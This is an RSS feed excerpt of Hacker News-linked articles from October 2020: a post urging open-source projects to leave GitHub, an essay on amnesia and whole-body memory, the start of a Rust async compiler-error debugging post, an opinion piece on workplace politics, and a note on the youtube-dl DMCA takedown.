<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>
<ul>
<li><a href="https://codeberg.org/">Codeberg</a><br>Codeberg is a registered German non-profit organization and I think it is the best alternative. Codeberg does not depend on external services. No third party cookies, no tracking. Hosted in the EU.<br>Relevant discussion on <a href="https://news.ycombinator.com/item?id=22795930">Hacker News</a>. Relevant <a href="https://codeberg.org/codeberg/org/src/branch/master/PrivacyPolicy.md">Privacy Policy</a></li>
<li><a href="https://notabug.org/">NotABug</a><br>NotABug.org is run by <a href="https://peers.community/">Peers</a>, a group of people interested in free software and free society. It is mostly for small projects though. Relevant <a href="https://notabug.org/tos">Privacy Policy</a>.</li>
<li><a href="https://sourcehut.org/">sourcehut</a><br>sourcehut is currently considered alpha and it is not going to stay free, but it does not have any tracking or advertising. All features work without JavaScript. Relevant <a href="https://man.sr.ht/privacy.md">Privacy Policy</a>. Relevant discussion on <a href="https://news.ycombinator.com/item?id=23030489">Hacker News</a>. After signing up you get the following message: <q>Payment is optional during the alpha, but be aware that it will become mandatory later. This service is funded by its users, not by investors.</q></li>
</ul>
<p>A few good solutions for self-hosting (not an exhaustive list):</p>
<ul>
<li><a href="https://gogs.io/">Gogs</a> - old discussion at <a href="https://news.ycombinator.com/item?id=11374003">Hacker News</a></li>
<li><a href="https://gitea.io/en-US/">Gitea</a> a community-managed fork of Gogs - discussed at <a href="https://news.ycombinator.com/item?id=17006503">Hacker News</a></li>
<li><a href="https://github.com/theonedev/onedev">OneDev</a> - discussed at <a href="https://news.ycombinator.com/item?id=22081419">Hacker News</a></li>
</ul>
</article></div>]]>
            </description>
            <link>https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874987</guid>
            <pubDate>Fri, 23 Oct 2020 22:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Memory Involves the Whole Body]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24874767">thread link</a>) | @betocmn
<br/>
October 23, 2020 | https://psyche.co/ideas/memory-involves-the-whole-body-its-how-the-self-defies-amnesia | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/memory-involves-the-whole-body-its-how-the-self-defies-amnesia">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>When you wake</strong> up in the morning, how do you know who you are? You might say something like: â€˜Because I remember.â€™ A perfectly good answer, and one with a venerable history. The English philosopher John Locke, for example, considered memory to be the foundation of identity. â€˜Consciousness always accompanies thinking,â€™ he wrote in 1694. â€˜And as far as this consciousness can be extended backwards to any past Action or Thought, so far reaches the Identity of that <em>Person</em>.â€™</p>
<p>For most of us, the question of where identity comes from doesnâ€™t have much bearing on day-to-day life. We donâ€™t have to <em>try</em> to remember who we are; it just happens. But for the <a href="https://www.thelancet.com/pdfs/journals/laneur/PIIS1474-4422(18)30444-7.pdf" rel="nofollow noreferrer noopener">growing</a> number of people who survive brain injury every year, it can be a different story. If you survive an accident or an illness that limits your ability to form new memories, leaving you with whatâ€™s called â€˜anterograde amnesiaâ€™, you might be forced to look elsewhere for your sense of self.</p>
<p>Over the past 15 years working at Headway East London, the UK-based brain injury charity, Iâ€™ve met many people for whom anterograde amnesia has been the cause of profound existential <a href="https://aeon.co/essays/matthew-had-a-brain-injury-who-is-he-after-brain-surgery" rel="noopener">change</a>. Sadie, a paediatric nurse and mother of two who survived a stroke. Gretha, a city worker who fell ill with an infection. Henry, a greengrocer who suffered heart failure during a violent assault, his brain starved of oxygen. They have all recovered well from a medical perspective but, because of amnesia, they find new conscious memories difficult â€“ or impossible â€“ to form. As a result, they live with great uncertainty and disorientation, not to mention dramatic restrictions on their day-to-day freedoms.</p>
<p>The ability to form new memories underpins almost all aspects of personal and professional responsibility. Sadie, Gretha and Henry all became unemployed after their brain injuries, and lost many of the connections and roles that gave meaning to their pre-amnesia lives. Both Sadie and Gretha were forced to move home to live with elderly parents, Henry to sheltered accommodation. When they arenâ€™t at home or at Headwayâ€™s centre, all three of them are shadowed every minute of the day by support workers.</p>
<p>The adjustment to amnesia can take a punishing psychological toll. Sadie, for example, lived with terrible anxiety for several years after her stoke. I remember how, as her frustration and panic peaked, she would fly into rages, often targeted at her blameless support worker. In the absence of any conscious recollection of what had led up to these furies, Sadie was at a loss to explain or contextualise them. It seemed to me that, as in a nightmare, she knew only that she didnâ€™t know what was going on.</p>
<p>This is a frightening lesson about what it means to live without the ability to form the conscious thought-memory described by Locke, what psychologists now term â€˜autobiographicalâ€™ memory. Recollecting recent events <a href="https://pubmed.ncbi.nlm.nih.gov/25685356/" rel="nofollow noreferrer noopener">allows</a> a person to orient themselves, ground their sense of identity and maintain a narrative thread that coherently places them in the world.</p>
<p>They have all found new ways to stabilise and feed their sense of self through action</p>
<p>But I want to caution against the idea, intimated by Locke, that the ongoing formation of conscious memory is the same thing as identity. Despite their often-bewildering conditions, every amnesia survivor I know is a distinct, vivid human being â€“ they each have an inimitable character and a strong sense of self. What is it, in the absence of recent memories, that allows them to know who they are?</p>
<p><strong>Many survivors have</strong> significant memories of their pre-injury lives, formed before amnesia set in, and these old memories can help anchor their identities. Sadieâ€™s relationship with her children, for example, is still hugely important to her. But, at the same time, Henry barely ever refers to his life before injury, and some <a href="http://whoareyounow.org/story/nifty" rel="nofollow noreferrer noopener">survivors</a> I know prefer to forget who they used to be. Even when pre-injury memories do play a role, Iâ€™m convinced that few survivors rely on them alone. Instead, Gretha, Sadie and Henry have all found new ways to stabilise and feed their sense of self through action: through habits and roles that allow them to keep growing and learning.</p>
<p>Since his injury, Henry has built a career as an artist. Though his conscious memories of this inevitably fade, he gravitates to the art studio with an unerring reliability, drawn back there by the positive feelings his work produces in him. A couple of years ago he was asked to design a badge for Headway members to wear at an exhibition opening event. It read â€˜ARTISTâ€™. He kept his copy and wears it frequently, though I believe he now has no conscious memory of the event it was made for.</p>
<p>Gretha speaks eloquently about how her own drawing practice, which she started at Headway, helps to orient her: â€˜I know my own handiwork. I know who I am. Itâ€™s not always strong but itâ€™s always me.â€™ She also speaks of its positive influence on her mood, an influence that works even in the absence of conscious recollection: â€˜Iâ€™m happier when Iâ€™ve been in the art studio even if I canâ€™t remember Iâ€™ve been there. Itâ€™s like, even if you havenâ€™t got the Champagne glass in your hand anymore, but you drank the Champagne, do you not feel pissed after?â€™</p>
<p>When Sadie sings during the music sessions at the centre, demonstrating her astonishing range and word-perfect recall of Motown classics, it can feel strange to know how profound her amnesia is outside this context. I also remember a day when one of the staff at Headway brought in her newborn baby to visit. On seeing them, Sadie dropped out of the excitable, somewhat distractible mode that often occupies her at the centre and calmly took the baby in her arms. She cradled the newborn with assurance while asking the mother acute, sensitive questions about its health and sleeping habits.</p>
<p>Sadie has a rich memory of her life before the injury, including her years as a paediatric nurse. The encounter with the baby surely evoked both the â€˜skillsâ€™ associated with that time, or what researchers would <a href="https://pubmed.ncbi.nlm.nih.gov/15037131/" rel="nofollow noreferrer noopener">call</a> â€˜proceduralâ€™ memories, as well as the explicit, autobiographical ones. But I think the experience was more than the sum of these parts; she hadnâ€™t simply reverted to the past. For a moment, and perhaps for the first time since her injury, Sadie was the most centred person in the room: oriented not just to the child in her arms and to the adults around her but to her own identity. I was watching her in the throes of a whole-person, embodied memory: a moment that unified her historical expertise, unconscious physical habits and consciously remembered experiences with her present intentions, bodily sensations and deeply felt emotion. I only wish I had asked her, in that moment, how she felt.</p>
<p>Amnesia survivors are most themselves in contexts that continually reinforce their embodied tendencies</p>
<p><strong>The observation Iâ€™m</strong> trying to make is that personhood isnâ€™t the sole property of the mind, or of the brain, or of any one function of these entities. Personhood is a property of the <em>whole body,</em> and the whole body is implicated in how both personhood and an individual <em>person</em> can persist in the face of perpetual forgetting.</p>
<p>It was reading a blog <a href="https://philosophyofbrains.com/2016/11/15/memory-and-the-self-rilkean-memory.aspx" rel="nofollow noreferrer noopener">post</a> by the philosopher Mark Rowlands, discussing his idea of â€˜Rilkean memoryâ€™, that finally gave me language for this hitherto unspoken intuition. Rowlands chose the name because of something that the poet Rainer Maria Rilke wrote in 1910 about how poetry emerges from memories:</p>
<blockquote>â€¦ memories themselves are not important. Only when they have changed into our very blood, into glance and gesture, and are nameless, no longer to be distinguished from ourselves â€“ only then can it happen that in some very rare hour the first word of a poem arises in their midst and goes forth from them.</blockquote>
<p>Unlike Lockean autobiographical memory, which is a property of conscious thinking alone, Rilkean memory lives in the action of the whole body, arising from the â€˜behavioural dispositionâ€™ or â€˜enduring moodâ€™ thatâ€™s left behind when conscious, narrative memory fades away. When persistent and entrenched enough, Rowlands <a href="https://philosophyofbrains.com/2016/11/16/memory-and-the-self-the-style-of-a-person.aspx" rel="nofollow noreferrer noopener">says</a>, these dispositions and moods become an â€˜existential styleâ€™, a way of being that can hold a person together in the face of â€˜catastrophic memory lossâ€™.</p>
<p>This is what I see in brain injury survivors such as Henry, Gretha and Sadie. When they take part in practices that mean something to them, they become absorbed in living truths that remind them who they are. Amnesia survivors, who have lost the conscious memory-formation so vulnerable to brain injury, are most themselves in contexts that continually reinforce their embodied tendencies, their bodily dispositions and feelings. The places where they are most confident in their identities are the ones in which they are supported not merely to think but to <em>do</em> the things they love. To support these survivors, we must take seriously the idea of whole-body, whole-person memory, and look for ways to reinforce it, wherever we can.</p>
<p>When I wake up each morning, there are things I recognise as part of â€˜meâ€™. The aura of dream is replaced almost immediately by a continuity of thought from the previous day. And behind this are layers of familiar sensation: the dryness of my skin; the exaggerated sensitivity of my hands; the way my eyes want to hide from the daylight; the empty feeling of my typical morning hunger; and the bodily restlessness that will soon get me out of bed. Words are there even before I realise it, and I feel a pang of regret as I break the silence. Then I look at my partner, stirring next to me, and recognise another whole domain of identity: the people I share my life with and the feelings they bring to life. Itâ€™s a cascade of embodiment, of tendency, of self, that emerges. Doubtless, if I survived a brain injury, some of these things might change or disappear. But not all of them.</p></div></div></div>]]>
            </description>
            <link>https://psyche.co/ideas/memory-involves-the-whole-body-its-how-the-self-defies-amnesia</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874767</guid>
            <pubDate>Fri, 23 Oct 2020 22:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging async generator errors in Rust]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24874283">thread link</a>) | @jamii
<br/>
October 23, 2020 | https://meltware.com/2020/10/21/rust-async-nonsense.html? | <a href="https://web.archive.org/web/*/https://meltware.com/2020/10/21/rust-async-nonsense.html?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>My colleague <a href="http://mattjibson.com/">Matt Jibson</a> and I recently found ourselves
in the unfortunate situation of debugging this hefty async/await-related error
from the Rust compiler:</p>

<div><div><pre><code>error[E0277]: `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)` cannot be shared between threads safely
   --&gt; src/materialized/src/mux.rs:138:100
    |
138 |       async fn handle_connection(&amp;self, conn: SniffedStream&lt;TcpStream&gt;) -&gt; Result&lt;(), anyhow::Error&gt; {
    |  ____________________________________________________________________________________________________^
139 | |         self.handle_connection(conn).await
140 | |     }
    | |_____^ `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)` cannot be shared between threads safely
    |
    = help: the trait `std::marker::Sync` is not implemented for `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)`
    = note: required because of the requirements on the impl of `std::marker::Sync` for `std::ptr::Unique&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;`
    = note: required because it appears within the type `std::boxed::Box&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;`
    = note: required because it appears within the type `std::option::Option&lt;std::boxed::Box&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;&gt;`
    = note: required because it appears within the type `coord::session::Portal`
    = note: required because of the requirements on the impl of `std::marker::Send` for `&amp;coord::session::Portal`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::describe_portal::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:std::string::String for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::describe_portal::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:std::string::String for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}]&gt;`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::advance_ready::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt; for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::advance_ready::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt; for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}]&gt;`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1&gt; {std::future::ResumeTy, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, i32, std::vec::Vec&lt;(std::string::String, std::string::String)&gt;, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), pgwire::protocol::State, impl futures::Future, impl futures::Future, coord::SessionClient, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::run::#0 0:pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:i32, 2:std::vec::Vec&lt;(std::string::String, std::string::String)&gt; for&lt;'r, 's, 't0, 't1&gt; {std::future::ResumeTy, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, i32, std::vec::Vec&lt;(std::string::String, std::string::String)&gt;, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), pgwire::protocol::State, impl futures::Future, impl futures::Future, coord::SessionClient, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::run::#0 0:pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::T…</code></pre></div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://meltware.com/2020/10/21/rust-async-nonsense.html?">https://meltware.com/2020/10/21/rust-async-nonsense.html?</a></em></p>]]>
            </description>
            <link>https://meltware.com/2020/10/21/rust-async-nonsense.html?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874283</guid>
            <pubDate>Fri, 23 Oct 2020 21:16:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No More Politics in the Workplace]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24874206">thread link</a>) | @jakelazaroff
<br/>
October 23, 2020 | https://jake.nyc/words/no-more-politics-in-the-workplace/ | <a href="https://web.archive.org/web/*/https://jake.nyc/words/no-more-politics-in-the-workplace/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article>
  <header>
    <time datetime="Fri Oct 23 2020 01:00:00 GMT-0400 (Eastern Daylight Time)">October 23, 2020</time>
    
  </header>
  <p>Last night, Expensify CEO David Barrett sent an email <a href="https://twitter.com/rklau/status/1319397164821348357?s=21">urging all their customers to vote for Joe Biden</a>. The response was predictably polarizing, with a lot of people arguing that <a href="https://twitter.com/danrothschild/status/1319646560607752194?s=21">workplaces shouldn’t be politicized</a>.</p>
<p>Okay, fine. But if we’re doing this, can we carry it through to the end? Because I can think of a lot of corporate political activism that the people complaining are suspiciously quiet about.</p>
<!--more-->
<p>They don’t seem to mind when companies <a href="https://twitter.com/pinboard/status/1318627385655242752?s=21">donate thousands of dollars to political campaigns</a>.</p>
<p>Or when they sign <a href="https://www.nytimes.com/2019/10/25/technology/dod-jedi-contract.html">multi-billion dollar contracts with the military</a>.</p>
<p>Or when they <a href="https://www.theatlantic.com/technology/archive/2018/06/how-amazon-helped-kill-a-seattle-tax-on-business/562736/">kill taxes that would fund affordable housing</a>.</p>
<p>Or when they <a href="https://www.vanityfair.com/news/2019/12/google-investigation-national-labor-relations-board-union-firings">fire employees involved in labor organizing</a>.</p>
<p>Or when they <a href="https://www.politifact.com/factchecks/2019/nov/21/donald-trump/did-trump-open-apple-plant-austin-no/">allow politicians to use their premises for propaganda</a>.</p>
<p>No, those are all the <strong>acceptable</strong> kind of corporate politics. The kind that happens in backrooms and hides away on balance sheets. The kind in which lobbyists scratch the backs of politicians in return for favors that aren’t <strong>technically</strong> quid pro quo.</p>
<p>The message seems to be that it’s fine when companies try to bend the system to their whims, but <strong>how dare they</strong> try to impose their politics on me, personally. They can put their thumbs on the scale to fatten their wallets, but they cross a line when they suggest that I might be a bad person.</p>
<p>It’s the same bullshit attitude behind Coinbase's decision to ban political discussion at work, even though <a href="https://www.investopedia.com/articles/forex/042015/why-governments-are-afraid-bitcoin.asp">a cryptocurrency exchange is an inherently political&nbsp;business</a>.</p>
<p>Listen. I get it. You want to be able to work without worrying whether you fall on the wrong side of your employer’s politics. That’s a fair stance to take.</p>
<p>And if you want to fully embrace that stance, more power to you. There are <strong>so many</strong> instances of private industry cozying up to the government for an unfair advantage. Let's end lobbying, corporate welfare and police/military contracts. Let's get rid of revolving doors and regulatory capture. Let's stop letting companies draft legislation. No more politics in the workplace.</p>
<p>But if your principled opposition begins and ends with someone telling you that a political candidate who <a href="https://www.washingtonpost.com/opinions/2020/08/13/trump-confesses-voter-supression/">has explicitly advocated for voter suppression</a> is anti-democratic, then maybe just sit this one out.</p>

</article>
</div></div>]]>
            </description>
            <link>https://jake.nyc/words/no-more-politics-in-the-workplace/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874206</guid>
            <pubDate>Fri, 23 Oct 2020 21:09:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The YouTube-DL Takedown]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24873805">thread link</a>) | @resynth1943
<br/>
October 23, 2020 | https://resynth1943.net/articles/youtube-dl-takedown/ | <a href="https://web.archive.org/web/*/https://resynth1943.net/articles/youtube-dl-takedown/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="content">
		
		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>


		<!-- Doing a little experiment here. -->
